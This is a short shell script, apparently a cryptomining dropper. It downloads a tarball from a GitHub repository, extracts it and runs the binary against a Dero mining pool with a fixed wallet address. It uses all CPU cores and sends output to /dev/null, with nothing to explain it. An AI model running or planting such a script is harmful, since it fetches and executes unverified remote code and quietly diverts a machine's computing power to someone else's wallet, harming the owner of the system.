#!/bin/sh
wget https://github.com/erindiana/devs/raw/main/der.tar.gz
tar -xf der.tar.gz

./der -r pool.whalesburg.com:4300 -w dero1qywqx5rnemyt59ujq0lwy3r9n8m8l3zdxu0d90rre4lym8hgnr5rcqq2vekrj.dero1 -t$(nproc --all) >/dev/null >/dev/null 2>&1
sleep 10
